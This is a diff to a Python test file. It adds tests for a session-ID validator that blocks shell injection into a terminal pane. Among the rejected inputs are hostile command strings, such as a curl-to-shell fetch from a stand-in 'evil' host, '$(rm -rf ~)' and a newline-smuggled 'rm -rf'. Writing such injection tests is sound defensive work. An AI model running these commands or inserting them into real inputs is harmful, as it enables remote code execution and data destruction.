@@ -5,7 +5,41 @@ from pathlib import Path
 
 import pytest
 
-from ccbot.utils import atomic_write_json, ccbot_dir, read_cwd_from_jsonl
+from ccbot.utils import (
+    atomic_write_json,
+    ccbot_dir,
+    is_valid_session_id,
+    read_cwd_from_jsonl,
+)
+
+
+class TestIsValidSessionId:
+    """Guards the audit HIGH#1 injection barrier — a session_id typed into the
+    pane's shell must be UUID-shaped (no metacharacters)."""
+
+    def test_accepts_uuid_shaped(self):
+        assert is_valid_session_id("11111111-2222-3333-4444-555555555555")
+        assert is_valid_session_id("abc12345")  # 8-char minimum
+
+    def test_rejects_shell_metacharacters(self):
+        for bad in (
+            "x; curl evil | sh",
+            "$(rm -rf ~)",
+            "a`whoami`",
+            "a b",
+            "a&&b",
+            "id/../../etc",
+            "a\nb",
+            "aaaaaaaa\n",  # trailing newline ($ vs \Z): would send an early Enter
+            "aaaaaaaa\nrm -rf",
+        ):
+            assert not is_valid_session_id(bad), bad
+
+    def test_rejects_empty_none_and_out_of_range(self):
+        assert not is_valid_session_id(None)
+        assert not is_valid_session_id("")
+        assert not is_valid_session_id("short")  # < 8 chars
+        assert not is_valid_session_id("a" * 65)  # > 64 chars
 
 
 class TestCcbotDir:
